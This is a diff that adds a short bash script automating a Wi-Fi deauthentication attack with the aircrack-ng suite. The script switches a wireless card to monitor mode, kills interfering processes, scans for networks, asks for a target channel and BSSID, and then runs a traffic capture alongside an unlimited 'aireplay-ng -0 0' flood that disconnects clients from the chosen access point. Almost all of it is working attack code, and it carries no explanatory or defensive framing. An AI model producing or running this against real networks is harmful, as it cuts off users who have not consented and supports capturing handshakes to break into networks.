@@ -1,0 +1,25 @@
+#!/bin/bash
+
+ifconfig
+
+read -p "Interface : " card
+
+ifconfig $card down
+iwconfig $card mode monitor
+ifconfig $card up
+
+airmon-ng check $card
+
+for ((i=1;i<=5;i++));do
+airmon-ng check kill
+done
+
+airodump-ng $card
+
+read -p "Channel : " ch
+read -p "BSSID : " bssid
+
+gnome-terminal -e "airodump-ng -c $ch --bssid $bssid $card"
+
+gnome-terminal -e "aireplay-ng -0 0 -a $bssid $card"
+
